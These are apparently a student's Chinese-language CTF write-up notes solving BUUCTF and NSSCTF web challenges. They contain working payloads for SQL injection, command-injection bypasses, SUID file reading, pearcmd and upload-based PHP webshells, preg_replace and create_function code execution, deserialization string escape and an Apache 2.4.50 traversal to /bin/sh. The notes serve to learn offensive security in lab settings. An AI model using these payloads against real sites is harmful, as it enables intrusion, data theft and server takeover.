# WP

## BUUCTF

### SQL

#### SUC2019EazySQL

输入1有回显判断为数字型注入，堆叠注入报表名得到Flag，然后爆列名无效；然后尝试其它注入无效，上网查询得知语句为                                           sql="select ".post['query']."||flag from Flag";

用*,1绕过异或

或者用1;set sql_mode=pipes_as_concat;select 0将异或变为连接

#### ** [SWPU2019]Web1

**sql注入点**随便发布了个广告,查看详情时发现url有**id**猜测是sql注入,测试后发现过滤了`or`,`#`,`--+`和空格

符号过滤:空格可用/**/和括号绕过,注释符可通过单引号闭合绕过(本题是单引号闭合)

**or过滤**:不能用order by查列数,但可通过union select一点一点测出列数;不能用information_schema

那查表名只能用

```bash
select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()
```

查不了列名,那只能**跳过字段名直接爆数据**

```bash
1' union select 1,database(),(select group_concat(b) from (select 1,2 as a,3 as b union select * from users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```

方法是将未知列名转换为其它的值,也就是括号里的select,先将1,2临时列名变为a,再将1,2,3列名转为b,最后a闭合,然后group_concat(b)就是将1,2,3列拼接查询

#### BabySql

先判断注入类型为字符型；然后输入万能密码报错，逐个尝试发现没有过滤空格、=，而是**or**然后尝试双写绕过成功；接着判断列数报错，尝试order by双写还是错误，只尝试or和**by**双写绕过成功，判断列数为三列；接着判断回显位报错，发现是**union select**双写绕过，判断为2，3回显；接着爆库名为’geek‘；爆表名时又发现**from**，**where**双写绕过，爆表名为b4bsql,geekuser；爆列名为id,username,password，最后成功获得flag。

#### *** 强网杯 2019随便注

判断为字符型注入，尝试联合注入，发现select被正则匹配过滤，所以另外采用堆叠注入并用show进行注入，show tables发现两个表并在1919810931114514（数字要用**反引号**）表中找到flag列，找到采用**预编译**并用concat（）拼接绕过正则匹配的方法即1'; PREPARE y from concat('sel','ect * from `1919810931114514`');EXECUTE y;#然后得到flag。

还有**改表改数据**位置的方法（不太懂）alter

#### [CISCN2019 华北赛区 Day1 Web5]CyberPunk

**二次注入**：可能插入时对字段的特殊字段进行转义处理，但是在存储时数据会被还原，所以可以调用被存储在数据库的恶意数据并执行sql语句。

页面源码提示通过file读源码，查看index源码，发现可用读取页面各种功能的源码，依次读取，发现均对$user_name和$phone进行了关键词过滤，但是在change处仅对对address仅做了**转义处理**，且有：

```sql
$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
```

即在修改时未对address做任何过滤，所以此处存在注入点，且有：

```php
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
```

即可进行报错注入。

所以注入的流程为：先在address处注入sql语句，然后再修改address将sql语句带入查询，最后会因为报错带出所查数据。（也可以',`address`=(select(....))#这样注入，因为源码除了change做了转义处理，其它功能并未对address过滤）

payload：' and updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),30,30)),3)#

最后updatexml所查数据有长度限制，所以用substr依次查询。

#### GYCTF2020Blacklist

判断位字符型注入，用堆叠注入依次找到表名，并得知flag在FlagHere列，接着想用联合注入获得数据，但被正则匹配过滤，然后用`HANDLER OPEN`语句打开一个表，使其可以使用后续`HANDLER READ`语句访问，该表对象未被其他会话共享，并且在会话调用`HANDLER CLOSE`或会话终止之前不会关闭即handler FlagHere open;handler FlagHere read first;handler FlagHere close;获得flag。

#### GXYCTF2019BabySQli

判断为字符型注入，且从username注入，但总是密码报错，查看网页源码时发现一串加密字符，解密后为select * from user where username = '$name'，查看题目源码后得知过滤了（、）、=、or，当查询信息时回显位2为“admin”，回显位3为md5加密后的所输入的password时输出flag，即1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b' #&pw=1

#### *  [NewStarCTF2022]multiSQL

 提示修改成绩，应该要修改数据库数据，即涉及sql注入，fuzz测试发现过滤了select，update；注入的时候尝试了多种绕过，但是都不行，最后发现堆叠注入可行（其实若过滤了正常注入，但是没有过滤show便可尝试堆叠注入），最后成功查到字段，但是update被过滤，可用**replace into绕过**

payload：

```sql
1';replace into score values("火华",200,200,200);#
```

最后可用查到两行数据，所以还要将原来的数据删除即：

```sql
1';delete from score where listen=11;#
```



### RCE

#### Exec

ping本地地址，使用ls命令查看目录，发现flag目录，然后使用cat命令打开该目录得到flag；使用；连接符隔开命令，间隔的命令无论对错都会执行，||连接符只有前面错后面的命令才执行，&&连接符要么都执行，若至少一错就都不执行

#### GXYCTF2019Ping

提示参数为ip，如之前一题考虑命令执行漏洞，用ls得知有flag.php和index.php;尝试用cat直接打开flag.php发现过滤了symbol和空格，尝试用**$IFS$9**绕过空格，成功绕过但无法打开，所以选择打开index.php，同样用绕过空格后成功打开查看到源码，发现其中使用preg_match匹配了flag字符，查询得知可用拼接的方式绕过如?ip=127.0.0.1;a=ag;cat$IFS$9fl$a.php或用**` ls `**(反引号)直接查询输出的目录()。最后在网页源码中找到flag。

#### RoarCTF2019 Easy Calc

查看网页源码得知有WAF防护，并发现calc.php文件打开后得知参数num和php过滤黑名单，然后不知道怎么做查询得知用到如下知识点：

**var_dump函数**：输出变量的相关信息

**scandir() 函数（命令行）**：返回指定目录中的文件和目录的数组。**'/'**代表根目录

**chr() 函数**：从指定的 **ASCII 值**返回字符。 ASCII 值可被指定为<u>十进制值</u>、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。

**file_get_contents() 函数（PHP）**：返回指定目录中的文件和目录的数组。：把整个文件读入一个字符串中。

**PHP的字符串解析特性**：1.删除空白符（空格） 2.将某些字符转换为下划线（包括空格）。

本题：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫**“ num”**，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。（绕过第一层非php的WAF）

先尝试用var_dump(scandir('/'))直接查询发现不行，所以用将/构造为ASCII并用chr（）函数即var_dump(scandir(chr(47)))查询根目录，发现f1agg目录，同理将该目录构造为chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)，并用file_get_contents()函数（GET传参）成功获得flag。

#### BuyFlag

先查看源码，没什么用，然后浏览页面点击menu选择payflag，页面提示：1、要支付数值即对money赋值2、明确访问者身份即要修改cookie。3、要输入正确的passward。选择用burp重发器修改，先修改cookie尝试后发现令user=1即可；然后在页面代码中发现提示passward需弱等于404且不能为纯数字，即随便加上字母；最后对money赋需支付值，但发现对数字长度有限值则用10e8科学计数法即可，最终获得flag。

#### [NewStarCTF2022]So Baby RCE

关键词过滤较好绕过（\用不了，可以用**${x}**）,空格过滤也好绕过，但是过滤了**/**就不好办了，无论是查看目录还是获得flag都不行。

绕过：通过cd转换目录，一级一级找，但是分号过滤可以用 **&&**（url编码）绕过，即先找到flag目录，再读取flag

payload：

cmd=cd${IFS}..%26%26cd${IFS}..%26%26cd${IFS}..%26%26n${a}l${IFS}ffff${a}llllaaaaggggg

#### [NewStarCTF2022]So Baby RCE Again

该题使用**shell_exec（）**进行RCE，该函数将命令的输出结果作为字符串返回，而不是直接打印（system），也就是要将返回内容写入文件，然后查看文件内容。

p1：

```bash
/?cmd=ls -al / > 1.txt
```

1.txt文在默认目录，也就是网站根目录下，查看内容得知flag就在根目录下，但是只有root用户有读取flag的权限

此处涉及**SUID提权**

普通用户可通过具有SUID权限的可执行文件以获得文件所有者权限（root）来执行代码命令

```bash
/?cmd=find / -perm -u=s -type f 2>/dev/null>123.txt
```

通过该命令找到相关文件，发现**date**文件（用作读时间）

通过**date -f**命令通过**报错**的方式可读取非时间文件。

payload：?cmd=date -f /ffll444aaggg **2>** 9.txt

通过错误的重定向引起报错从而读出flag

### SSTI

#### 护网杯 2018]easy_tornado

要用到的知识点：

**render**：python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过**{{}}**进行传递变量和执行简单的表达式。

**Tornado**：是一种 Web 服务器软件的开源版本。在tornado模板中，存在一些可以访问的快速对象，如handler.settings指向RequestHandler.application.settings里面就有cookie_secret

**md5**：一种加密算法

打开flag.txt知道flag在fllllllllllllag中即?filename=/fllllllllllllag，打开welcome.txt提示render，hints.txt中提示filehash的加密方法，即要获得cookie_secret，不知道如何获取先对filename赋值，赋值后发现render函数，故通过赋值{{handler.settings}}获得cookie_secret，然后成功获得密文，最后得到flag。

#### ACTF2020 新生赛BackupFile

知识点：

**php弱比较**：== 是不判断二者是否是同一数据类型，而===是更为严格的比较，它不仅要求二者值相等，而且还要求它们的数据类型也相同。

**常见的备份文件后缀**：.rar .zip .7z .tar .gz .bak .swp .txt .html

**is_numeric函数**：用于检测变量是否为数字或数字字符串

**intval() 函数**：用于获取变量的整数值

**isset()函数**：判断元素是否为空

用dirsearch扫描找到文件，下载打开后得到源码，代码审计后发现对key赋值必须为数字且取整数值后需与参数str弱等于，故取key为123得到flag。

#### [BJDCTF2020]The mystery of ip

根据题目猜测应该<u>与ip有关</u>，但是进来后没有任何提示（参数），想通过ip传参，发现没有什么效果，抓包给**xff**传参发现是模板注入

PHP的smarty模板注入

判断：输入{$smarty.version}看到返回的smarty的版本号。

这个模板可以直接通过命令注入

#### [BJDCTF2020]Cookie is so stable

**SSTI**：在flag页面下发现输入框，猜想是注入类型攻击，测试时发现不管输入命令、代码或是xss都正常返回，但模板注入测试就无返回，故应该是SSTI

**cookie注入**：考虑到题目涉及cookie以及页面源码提示cookie所以考虑在cookie中进行SSTI（在cookie加；隔开命令进行注入），通过判断（先通过网上的流程图判断出是twig或jinja2，在通过对应的命令判断）发现为**twig模板**，然后通过网上给的payload直接获得flag

### 文件类

#### LFI

##### * [BSidesCF 2020]Had a bad day

点击图片，url变化有点像文件包含，尝试用php伪协议读，因为图片url都没有后缀，所以源码可能会自动添加后缀，尝试一下发现确实如果自己加了后缀会报错，不加却能读出源码

源码的确是文件包含，所以尝试包含flag文件，但前提是**strpos**( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")，故flag文件得包含在以上文件下（除index，因为index在首位函数返回int(0)，依然不能过判断）

包含在文件下后再用协议读即可，或用php://filter/convert.base64-encode/index/resource=flag，index不出现在首位即可。

而对于00截断的条件是5.3.24之前的php版本（想用flag.php%00index）

##### HCTF2018WarmUp

网页只有一张图片所以直接查看源码，然后发现其中有一个php文件，用网页打开文件发现代码，其中又有一个php文件打开后发现提示flag在ffffllllaaaagggg中，审计代码发现可传参数file以及文件包含函数include，且file最后会传入$page,且$page需满足在$whitelist中，所以找到file应传入值。综上猜测是涉及文件包含的题目，最后枚举找到目标目录。

##### **[NewStarCTF2022]IncludeTwo

```php
if(!preg_match("/base64|rot13|filter/i",$_GET['file']) && isset($_GET['file'])){  
    include($_GET['file'].".php");
}
```

文件包含但是过滤了filter不能直接读flag，也考虑由php://input写入命令，但是include命令中最后拼接了.php不能写入命令。

最后在网上知道了这题是**pear**的getshell

**include $_GET['f'].php)是pear的标志模板**

即利用这个文件的pear命令行，其中有可利用参数config-create，命令传入两个参数，第一个参数是要写入的命令，第二个参数是写入的文件路径。

最后在burp中GET传入**/?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=eval($_POST[1])?>+/var/www/html/a.php** （不在URL上传，是因为直接在URL上传可能导致<>解码错误）

代码审计：调用/usr/local/lib/php/pearcmd.php（最后会拼接.php）的config-create方法将命令写入/var/www/html/a.php（也就是在网页根目录下创建新文件a.php并写入shell）。最后通过shell拿flag。

#### LFU

##### MRCTF2020你传你🐎呢

**.htaccess**：叫分布式配置文件，它提供了针对目录改变配置的方法——在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。并且子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。一般来说，如果你的虚拟主机使用的是Unix或Linux系统，或者任何版本的Apache网络服务器，从理论上讲都是支持.htaccess的。

**目录规则**:一般我们将.htaccess文件放置在网站的根目录，控制所在目录及所有子目录，而如果放置在子目录中，会受上级目录中.htaccess文件影响，是不起任何作用的。

.htaccess可以实现：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。

**题解**：

上传一句话木马失败，尝试修改php后缀绕过失败，上传图片马失败，最后上传.htaccess改变文件拓展名（将png改为php）成功，然后成功上传木马获得flag。

<FilesMatch "a.png">

SetHandler application/x-httpd-php

</FilesMatch>

##### SUCTF 2019CheckIn

**php.ini**

是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。

PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，.user.ini中设置。

**.user.ini**

是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。

它比.htaccess(分布式配置文件)用的更广，不管是nginx/apache/IIS，只要是以fastcgi(进程管理器)运行的php都可以用这个方法。

**php配置项**

中**auto_prepend_file**指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。auto_append_file类似，只是在文件后面包含。

**绕过exif_imagetype()**

exif_imagetype() 读取一个图像的第一个字节并检查其签名。判断一个图像的类型
文件头绕过，几个常见的文件头对应关系：
（1） .JPEG、.JPE、.JPG：“JPGGraphic File”
（2） .gif：“GIF 89A”
（3） .zip：“Zip Compressed”
（4） .doc、.xls、.xlt、.ppt、.apr：“MS Compound Document v1 or Lotus Approach APRfil”

也可以直接上传图片，在图片的最后加上一句话木马的内容


**题解**：

直接上传php文件，发现有黑名单过滤，然后尝试上传.png文件，成功上传但<?被过滤，将内容变为脚本标记格式即：<script language="php"> @eval($_POST['cmd']);</script>>发现被exif_imagetype()过滤，可用文件头绕过，然后上网查看可由.user.ini文件构成php后门即auto_prepend_fiel=a.png然后上传相关文件，最后用蚁剑连接获得flag。

也可通过GET传参后用scandir扫描根目录然后用system(‘cat/flag’)获得flag

### RCE

#### [GXYCTF2019]禁止套娃

**无参RCE**



### PHP

#### BJDCTF2020Easy MD5

要用到的知识点：

**md5(string,raw)**：string为必需。规定要计算的字符串。

​							   raw为可选。规定十六进制或二进制输出格式： TRUE - 原始 16 字符二进制格式；FALSE - 默认。32 字符十六进制数。

md5加密后的值开头为0E时值之间相等

哈希函数无法处理数组返回值为false

查看源码找不到有用信息，尝试sql注入无效，然后用burp重发器查看给出提示：Hint: select * from 'admin' where password=md5($pass,true)，即将传入的参数进行md5加密后十六进制输入sql语句，所以可构造or语句绕过如输入参数：ffifdyop，然后出现源码参数a、b不相等，但md5加密后弱相等，所以可构造字符串或者直接传入数组，其后一关因两参数加密后强相等所以只能传入数组，最后得到flag。

#### 极客2019PHP

**常见的备份文件后缀名**：.git .svn .swp .~ .bak .bash_history .rar .zip .7z .txt .html .tar.gz .old .temp

提示有备份文件，用dirsearch扫描后台目录（429问题可用-s降低扫描速度）得到www.zip打开后下载一个压缩文件，打开其中的flag.php无有用信息，打开index.php发现其中包含class.php且用GET传参数$select，并且对select进行反序列化。打开class.php，代码审计后发现需要对username赋值为'admin'，对passward赋值为100，且代码需要序列化并绕过wakeup()，编写代码对变量$a赋新类的的值并序列化，通过**改变属性数目**绕过wakeup（），然后由于username和passward的属性都是private所以可直接在序列化后的字符串中加上不可见**字符%00**或对其进行**url编码**后对变量select赋值然后成功获得flag。

#### MRCTF2020Ez_bypass

源码要求`md5($id) === md5($gg) && $id !== $gg`可通过数组绕过，即id[]=a&gg[]=b，然后传参passwd其中有`is_numeric() `函数检测变量是否为数字或数字字符串，即要求passwd不是数字或数字字符串并且弱等于1234567，故构造payload=1234567a，最后成功拿到flag。

#### SecretFile

查看网页源码得到一个php文件，打开后点击secret提示用burp重发器查看，然后又得到一个php文件，打开后得知flag存放在flag.php打开后发现无法直接得到，所以用php://filter协议转码为base64最后得到flag

#### Online Tool（RCE白名单）

利用/绕过escapeshellarg/escapeshellcmd函数

**escapeshellarg:**

给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，将参数限制在双引号zh

**escapeshellcmd:**

 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义（^ or \）

#### *** [BJDCTF2020]ZJCTF，不过如此

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
  return preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str
  );
}

foreach($_GET as $re => $str) {
  echo complex($re, $str). "\n";
}

function getFlag(){
  @eval($_GET['cmd']);
}
?>
```

**preg_replace** **/e** 模式下的代码执行问题：**preg_replace** 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 **preg_replace** 函数的第二个参数）当做代码来执行

> **反向引用**
>
> 对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

```php
return preg_replace( '/(' .$re.')/ei','strtolower("\\1")',$str);
```

故此处的**'strtolower("\ \1")'** 相当于**eval('strtolower("\ \1");')**其中\ \1指第一个子匹配项

综上即将$re的第一个匹配值当作代码执行：strtolower("$re(1)");

```php
foreach($_GET as $re => $str) 
{echo complex($re, $str). "\n";}
```

该代码通过循环遍历以**GET传参**的方式将**str值**与**re键**作匹配，所以最终传入strtolower（）的是**str值**，但参数名为**re**，所以re传入**.* **将任意字符与正则匹配；

但又由于在PHP中，对于传入的非法的 **$_GET** 数组参数名，会将其转换成下划线，这就导致正则匹配失效，但当非法字符为首字母时，只有点号会被替换成下划线，所有改为**\S*=${eval($_POST[cmd])}**

即**eval('strtolower("${eval($_POST[cmd])}");')**，

之所以要匹配到**{${eval($_POST[cmd])}}** 或者 **${eval($_POST[cmd])}**是因为**可变变量**即在php中双引号包裹的字符串可以解析变量，而单引号不行，故会先执行**eval($_POST[cmd]**成功后变为**eval('strtolower("{${1}}");')**最后通过后门命令注入查看flag

#### [安洵杯 2019]easy_web

**加解密读文件**：图片提示base64，故想将img值解码，同两次base64解密和一次十六进制数解密（不知道为什么怎么知道要解密这么多次，可能是根据加密类型特征判断吧）获得内容是555.png

所以想通过同样的加密手段读文件，flag.php读不出来，但读出了index.php，查看源码后发现正则匹配了命令注入，但是通过转义很好绕过，接下来是MD5的**字符型强碰撞**，上网找了payload（不知道为什么要url加密后上传），最后通过c\at**%20**/flag获得flag（在bp上通过GET传参输命令该url编码的要记得编码）

#### [HarekazeCTF2019]encode_and_encode

查看源码，可通过php://input将内容写入，所以可用php伪协议查看flag，但需经过json编码，且需绕过过滤器，过滤器对关键词进行了过滤，引出了json编码数据中的一个小Trick：

> **\uXXXX**可以在JSON中转义字符，例如A与\u0041等效，即可用unicode编码绕过关键词过滤

最后构造payload：{"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}，通过bp利用post方式传参。

#### [NewStarCTF2023]Begin of PHP

考的挺多，但不是特别难，一共有5关，前两关都是**非字符串**的MD5/sha1强碰撞，直接用数组绕过即可，然后level3涉及**strcmp漏洞**

```php
strcmp($_GET['key4'],file_get_contents("/flag")) == 0
```

当传入其它非字符串类型的的参数时（比如数组），类会发生报错信息，同时return 0，即可满足条件（比较双方都为0时，返回0）

level4涉及**is_numeric漏洞**

```php
!is_numeric($_GET['key5']) && $_GET['key5'] > 2023
```

传入任意字母或%00截断都可绕过。

level5涉及**变量覆盖**，通过POST传参使$flag5为ture即可绕过，有正则过滤所以字母、数字，所以只需要传入任意非字母数字字符即可绕过。

### Java

#### [RoarCTF 2019]Easy Java

在hlep中发现下载页面是java页面，弱口令爆破获得密码（然而字典里并没有正确密码），进去后没有任何提示，只有尝试java文件下载，考察了java web的基础：

```java
 WEB-INF主要包含一下文件或目录：
    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
    /WEB-INF/database.properties：数据库配置文件
```

先读取初始化配置信息/WEB-INF/web.xml，找到FlagController，读取相应的.class文件WEB-INF/classes/com/wm/ctf/FlagController.class（POST请求；而且POST请求的**Download**得大写，应该是get传参的url编码不区分大小写吧？）最后base64解码获得flag

### 反序列化

#### 网鼎杯 2020 青龙组AreUSerialz

在process()函数中找到read()函数，猜想要读取flag就要执行这个函数，即op弱等于字符2；然后在read()函数找到**file_get_contents()**函数，所以可令filename=flag.php来找到flag；然后要调用process()函数就要执行_ destruct()函数，在反序列化时会执行析构函数，所以要序列化；又因在_destruct()函数中不能使op强等于符号2，所以对op赋值2；接下来在is_valid()函数中对序列化后的ASCII做了长度限制，所以各元素属性需被限制为pulic以免不可见字符的干扰，最后上传序列化字符串在网页源码中获得flag。

#### *** [网鼎杯 2020 朱雀组]phpweb

点进来什么提示都没有，抓包后发现func和p参数，应该从这入手，题目说是php那就想搞到php源码，然后盲猜两个参数的作用（猜不到），即通过func传入函数，p传入函数执行代码，即**file_get_contents**(index.php)得到源码

进来发现过滤了好多参数，然后看到__destruct()，应该是反序列化，即通过func反序列化和通过p传入序列化字符串，最后调用gettime()函数，果然通过**call_user_func（）**实现了两个参数的作用：

   call_user_func ：( `$callback`, `$parameter`$... )

   第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。 

然后是查目录找flag，找不到啊！最后通过**find命令**找到flag路径，然后由cat查看 

find / -name flag

#### ** ** [安洵杯 2019]easy_serialize_php

考点：字符逃逸、session反序列化、变量覆盖

```php
 <?php
$function = @$_GET['f'];
function filter($img){  
    $filter_arr = array('php','flag','php5','php4','fl1g');         $filter = '/'.implode('|',$filter_arr).'/i';  
    return preg_replace($filter,'',$img);
}

if($_SESSION){  
    unset($_SESSION);
}
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);
if(!$function){  
    echo '<a href="index.php？f=highlight_file">source_code</a>';
}
if(!$_GET['img_path']){  
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{  
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));
if($function == 'highlight_file'){  
    highlight_file('index.php');
}else if($function == 'phpinfo'){  
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){  
    $userinfo = unserialize($serialize_info);  
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```

先审计代码块：

1.过滤块：对$img参数内容过滤

2.属性块：先清空$_ SESSION内容，再对$_ SESSION数组赋值，其中user好像是固定值，function由$function赋值，但**重点**是**extract($_POST)**同过POST传参可对$_ SESSION进行参数覆盖（**覆盖原来的参数和值**，也就是可改变属性数量），所以$_ SESSION的内容可**自由控制**（类似类中可控制的属性）

3.加密块：第一个if不用管，对于第二个if首先是对$_ SESSION又赋值了一个键名为img的参数，而且根据最后的只解码了一次base64，所以只能选择第一个分支，也就是img的值是不可控制的（类似类中想要**逃逸**来控制的属性）

4.功能块：先进行了序列化后进入过滤器过滤（**字符串逃逸触发**），提示了令$function == 'phpinfo'找到了flag的名字，重要的是当$function == 'show_image'时进行了反序列化，且将img值解码后显现文件内容，所以能通过将img赋值为flag文件名**读取flag**

**方法**：

思路：

1.先找到要逃逸的属性并构造其数据串即：**";**s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}加粗内容也属于目标字符串内容，**方便最后闭合**

2.在可控制的属性中选择一个用来被过滤（增加或减少字符），然后选择一个来承载目标，如一下的user/function；又或者2中的键名/键值

3.再将承载目标的字符串补全即：s:8:"**function**";s:41:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";

4.最后再算清要吞掉或吐出的字符长度即：

**";s:8:"function";s:41:"**";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"

**注意要加2**，也就是还要算上前面闭合的**";**

5.根据算出的值对承担字符操作的属性赋值即：

s:4:"**user**";s:**23**:"flagflagflagflagflagphp";

6.最后构造好payload后再根据题目要求传入即可，本题就是POST传参还有参数名是$后的，本题是_SESSION

**加粗为属性名**

1.键值逃逸：

_SESSION[**user**]=flagflagflagflagflagphp& _SESSION[**function**]=";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"2";}

序列化后为：

a:3:{s:4:"**user**";s:23:"flagflagflagflagflagphp";s:8:"**function**";s:41:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"**img**";s:20:"Z3Vlc3RfaW1nLnBuZw ==";}

经过过滤器后：

a:3:{s:4:"**user**";s:23:"";s:8:"function";s:41:"";s:3:"**img**";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw ==";}

被赋值为flag文件名的img替代了原来的img

2.键名逃逸：

_SESSION[**phpflag**]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}

序列化后为：

a:2:{s:7:"**phpflag**";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"**img**";s:20:"Z3Vlc3RfaW1nLnBuZw ==";}

过滤后为：

a:2:{s:7:"**";s:48:**";s:1:"1";s:3:"**img**";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw ==";}

顶替掉了原来的img



最后还提示flag文件名又变化，只需重新编码替换掉就行，因为属性值长度并没变。

#### ** **[NewStarCTF2022]Maybe You Have To think More

涉及**thinkphp5**框架的**代码审计**，在此基础上进行pop链的构造。

### 另类

#### [ASIS 2019]Unicorn shop

**unicode**的安全编码问题

#### [BSidesCF 2019]Kookie

抓正常登录的包,发现Set-Cookie: username=cookie; 所以传包将username设为admin

### [NewStarCTF2022]ezAPI

在www.zip文件下获得php源码，审计后发现存在注入点：

```php
$data = '{"query":"query{\nusers_user_by_pk(id:' . $id . ') {\nname\n}\n}\n", "variables":null}';
```

不会做，wp中说明该题是GraphQL注入（类似SQL注入的利用）

通过POST传参$data以拼接查到接口内容

以下是查询所有接口的playload：

```bash
{"query":"\n query IntrospectionQuery {\r\n      __schema {\r\n        queryType { name }\r\n        mutationType { name }\r\n         subscriptionType { name }\r\n        types {\r\n           ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n     }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n       name\r\n      description\r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n           ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n       }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n       interfaces {\r\n        ...TypeRef\r\n      }\r\n       enumValues(includeDeprecated: true) {\r\n        name\r\n         description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n     }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n     }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n       name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n               kind\r\n              name\r\n              ofType {\r\n                 kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                   }\r\n                }\r\n              }\r\n            }\r\n           }\r\n        }\r\n      }\r\n    }\r\n  ","variables":null}
```

最后找到flag接口，最终payload：

```bash
&data={"query":"query{\nffffllllaaagggg_1n_h3r3_flag {\nflag\n}\n}\n", "variables":null} 
```



## Server

### Apache

#### [NewStarCTF2022]Unsafe Apache

apache/2.4.50 路径穿越漏洞

通过burp在http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh

下通过**echo;**ls进行任意代码执行

payload：echo;cat /f*

## NSSCTF

### JS

#### [SWPUCTF 2021 新生赛]jicao

json_encode()和json_decode()是编译和反编译过程，注意json只接受utf-8编码的字符，所以json_encode()的参数必须是utf-8编码，否则会得到空字符或者null。

```php
$json=json_decode($_GET['json'],true);
json['x']=="wllm"
```

json_decode()为**true**时：返回数组；

故以上返回数组-->json={"x":"wllm"}

当为**false**（默认为false）时：返回对象。



### PHP

#### [NISACTF 2022]level-up

特别综合的题目

涉及：

1.爬虫协议

2.MD5/sha1强碰撞（使用burp提交）

3.php语言解析特性

4.无字母数字RCE的create_function（）绕过：

先有正则匹配：^[a-z0-9_]*$，即首位不可出现字母、数字、下划线

**$a(' ',$b)**

```php
<?php
$myFunc=create_function('$a','$b','return($a+$b);}eval($_POST["a"]);\\')
?>
最后得到：
function myFunc($a, $b)
{ 
    return $a+$b; 
} 
eval($_POST['a']);//}
```

几个要点：

1.进行拼接的代码前有**;}**形成源码的闭合

2.最后注释掉源码生成的**}**

综上先有;}造成可执行代码的逃逸，然后}注释使整个代码可执行，配合一些内置读写函数进行flag的读

payload：

a=\** create_function&b=return"1";}**echo(file_get_contents(‘/flag’))**;**//

#### MD5

##### [SWPUCTF 2021 新生赛]easy_md5

##### 

```php
$name != $password && md5($name) == md5($password)
```

1、数组绕过（强弱类型比较皆可）sha1()一样

MD5不能加密**数组**，皆返回NULL

2、($_ POST['array1']) && isset($_POST['array2'])

此时不能传入数组，应用长字符串进行绕过

